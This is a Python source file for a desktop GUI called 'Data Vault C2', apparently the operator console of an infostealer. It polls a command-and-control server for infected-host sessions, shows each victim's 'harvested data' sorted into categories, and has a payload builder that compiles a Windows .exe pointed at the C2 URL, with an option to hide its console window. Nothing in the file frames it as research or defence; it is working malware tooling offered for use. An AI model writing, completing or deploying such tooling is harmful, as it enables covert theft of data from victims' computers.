import customtkinter as ctk
from tkinter import filedialog, messagebox
import requests
import threading
import time
import re # Import the regular expression module
from builder import build_payload

# --- CONFIGURATION ---
# IMPORTANT: Use your public Render URL here once deployed!
C2_SERVER_URL = "http://127.0.0.1:5002"

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Data Vault C2")
        self.geometry("1200x700") # Increased size for new layout

        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # --- DATA STORAGE ---
        self.sessions = {}
        self.session_widgets = {}
        # New variables for the detail view
        self.detail_view_data_map = {}
        self.detail_view_tab_buttons = {}
        self.detail_view_content_textbox = None
        
        # --- WIDGETS ---
        # Left frame for builder and sessions list
        self.left_frame = ctk.CTkFrame(self, width=300, corner_radius=0)
        self.left_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")
        self.left_frame.grid_rowconfigure(3, weight=1)

        # Right frame for displaying data in a tabbed view
        self.right_frame = ctk.CTkFrame(self, corner_radius=0)
        self.right_frame.grid(row=0, column=1, sticky="nsew", padx=(5,0))
        self.right_frame.grid_rowconfigure(1, weight=1)
        self.right_frame.grid_columnconfigure(0, weight=1)
        
        self.setup_left_frame()
        self.setup_right_frame()
        
        # --- POLLING ---
        self.polling_active = False
        self.start_polling()

    def setup_left_frame(self):
        # This function remains largely the same as before
        builder_frame = ctk.CTkFrame(self.left_frame, fg_color="transparent")
        builder_frame.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
        ctk.CTkLabel(builder_frame, text="Payload Builder", font=ctk.CTkFont(weight="bold")).pack()
        self.payload_name_entry = ctk.CTkEntry(builder_frame, placeholder_text="payload_name")
        self.payload_name_entry.pack(fill="x", pady=5)
        self.debug_mode_var = ctk.BooleanVar()
        ctk.CTkCheckBox(builder_frame, text="Debug Mode (Show Console)", variable=self.debug_mode_var).pack(anchor="w", pady=5)
        self.build_button = ctk.CTkButton(builder_frame, text="Build Payload", command=self.build_payload_handler)
        self.build_button.pack(fill="x", pady=(5, 10))
        
        ctk.CTkFrame(self.left_frame, height=2, fg_color="gray30").grid(row=1, column=0, sticky="ew", padx=10)
        
        self.sessions_label = ctk.CTkLabel(self.left_frame, text="Active Sessions (0)", font=ctk.CTkFont(weight="bold"))
        self.sessions_label.grid(row=2, column=0, padx=10, pady=10)
        
        self.sessions_frame = ctk.CTkScrollableFrame(self.left_frame, label_text="", corner_radius=0, fg_color="transparent")
        self.sessions_frame.grid(row=3, column=0, sticky="nsew", padx=10, pady=(0, 10))

    def setup_right_frame(self):
        """Redesigned to support a tabbed/detailed view."""
        self.hostname_label = ctk.CTkLabel(self.right_frame, text="Select a session to view data", font=ctk.CTkFont(size=16, weight="bold"))
        self.hostname_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
        
        # This frame will hold the data categories and the content
        self.data_container = ctk.CTkFrame(self.right_frame, fg_color="transparent")
        self.data_container.grid(row=1, column=0, sticky="nsew", padx=10, pady=(0, 10))
        self.data_container.grid_columnconfigure(1, weight=1)
        self.data_container.grid_rowconfigure(0, weight=1)

        # Panel on the left for category buttons (our "tabs")
        self.tab_panel = ctk.CTkScrollableFrame(self.data_container, width=200, corner_radius=0)
        self.tab_panel.grid(row=0, column=0, sticky="nsw", padx=(0, 5))
        ctk.CTkLabel(self.tab_panel, text="Data Categories").pack(pady=5) # Initial placeholder

        # Panel on the right for displaying content
        content_panel = ctk.CTkFrame(self.data_container, corner_radius=0, fg_color="transparent")
        content_panel.grid(row=0, column=1, sticky="nsew")
        content_panel.grid_rowconfigure(0, weight=1)
        content_panel.grid_columnconfigure(0, weight=1)
        
        self.detail_view_content_textbox = ctk.CTkTextbox(content_panel, wrap="word", corner_radius=0)
        self.detail_view_content_textbox.grid(row=0, column=0, sticky="nsew")
        self.detail_view_content_textbox.insert("0.0", "Harvested data will be displayed here...")
        self.detail_view_content_textbox.configure(state="disabled")

    def display_session_data(self, session_id):
        """
        Overhauled to parse the data string and create the tabbed view.
        """
        session = self.sessions.get(session_id)
        if not session: return

        self.hostname_label.configure(text=f"Host: {session.get('hostname', 'N/A')}")
        
        # Clear previous session's data and buttons
        for widget in self.tab_panel.winfo_children():
            widget.destroy()
        self.detail_view_tab_buttons = {}
        
        # The magic: Use regex to parse the data harvested by the payload
        harvested_text = session.get("data", "No data available.")
        # This pattern looks for "--- Title ---\n\nContent..."
        pattern = re.compile(r"--- (.*?) ---\n\n(.*?)(?=\n\n---|\Z)", re.DOTALL)
        matches = pattern.findall(harvested_text)
        
        self.detail_view_data_map = {title.strip(): content.strip() for title, content in matches}
        
        if not self.detail_view_data_map:
             # Handle case where data is not formatted correctly or is empty
            self.update_content_view("Info", fallback_text="No parsable data found for this session.")
            return
            
        # Create a button for each data category
        for title in self.detail_view_data_map.keys():
            button = ctk.CTkButton(
                self.tab_panel,
                text=title,
                anchor="w",
                fg_color="transparent", # Make it look like a tab, not a button
                command=lambda t=title: self.update_content_view(t)
            )
            button.pack(fill="x", padx=5, pady=2)
            self.detail_view_tab_buttons[title] = button
            
        # Automatically select and display the first category
        if self.detail_view_data_map.keys():
            first_tab_title = list(self.detail_view_data_map.keys())[0]
            self.update_content_view(first_tab_title)

    def update_content_view(self, selected_title, fallback_text=None):
        """Updates the content textbox and highlights the active 'tab' button."""
        if fallback_text:
            content = fallback_text
        else:
            content = self.detail_view_data_map.get(selected_title, "Content not found.")

        # Update the textbox content
        self.detail_view_content_textbox.configure(state="normal")
        self.detail_view_content_textbox.delete("0.0", "end")
        self.detail_view_content_textbox.insert("0.0", content)
        self.detail_view_content_textbox.configure(state="disabled")
        
        # Update button appearances to show which one is active
        for title, button in self.detail_view_tab_buttons.items():
            if title == selected_title:
                button.configure(fg_color="gray20") # Highlight color
            else:
                button.configure(fg_color="transparent")

    # ----- UNCHANGED METHODS FROM PREVIOUS VERSION -----
    
    def start_polling(self):
        if not self.polling_active:
            self.polling_active = True
            self.poll_thread = threading.Thread(target=self.poll_for_sessions, daemon=True)
            self.poll_thread.start()
            self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def on_closing(self):
        self.polling_active = False
        self.destroy()

    def poll_for_sessions(self):
        while self.polling_active:
            try:
                response = requests.get(f"{C2_SERVER_URL}/api/get_sessions", timeout=10)
                response.raise_for_status()
                self.after(0, self.update_gui_with_sessions, response.json())
            except requests.exceptions.RequestException:
                pass
            time.sleep(5)

    def update_gui_with_sessions(self, server_sessions):
        self.sessions_label.configure(text=f"Active Sessions ({len(server_sessions)})")
        server_session_ids = {s["session_id"] for s in server_sessions}
        
        for session_data in server_sessions:
            sid = session_data["session_id"]
            if sid not in self.sessions:
                self.sessions[sid] = session_data
                self.add_session_widget(session_data)
        
        for sid in list(self.sessions.keys()):
            if sid not in server_session_ids:
                if sid in self.session_widgets:
                    self.session_widgets[sid].destroy()
                    del self.session_widgets[sid]
                del self.sessions[sid]

    def add_session_widget(self, session_data):
        sid = session_data["session_id"]
        hostname = session_data["hostname"]
        button = ctk.CTkButton(self.sessions_frame, text=f"{hostname}", anchor="w",
                               command=lambda s=sid: self.display_session_data(s))
        button.pack(fill="x", padx=5, pady=2)
        self.session_widgets[sid] = button

    def build_payload_handler(self):
        payload_name = self.payload_name_entry.get()
        if not payload_name:
            messagebox.showerror("Error", "Payload name cannot be empty.")
            return
        output_dir = filedialog.askdirectory(title="Select Save Directory")
        if not output_dir: return
            
        self.build_button.configure(state="disabled", text="Building...")
        self.update_idletasks()
        threading.Thread(target=self._run_build, args=(C2_SERVER_URL, output_dir, payload_name), daemon=True).start()

    def _run_build(self, c2_url, output_dir, payload_name):
        success = build_payload(c2_url=c2_url, output_dir=output_dir, payload_name=payload_name, debug_mode=self.debug_mode_var.get())
        self.after(0, self.on_build_complete, success, payload_name)

    def on_build_complete(self, success, payload_name):
        if success:
            messagebox.showinfo("Success", f"Payload '{payload_name}.exe' built successfully!")
        else:
            messagebox.showerror("Build Failed", "Check console for details.")
        self.build_button.configure(state="normal", text="Build Payload")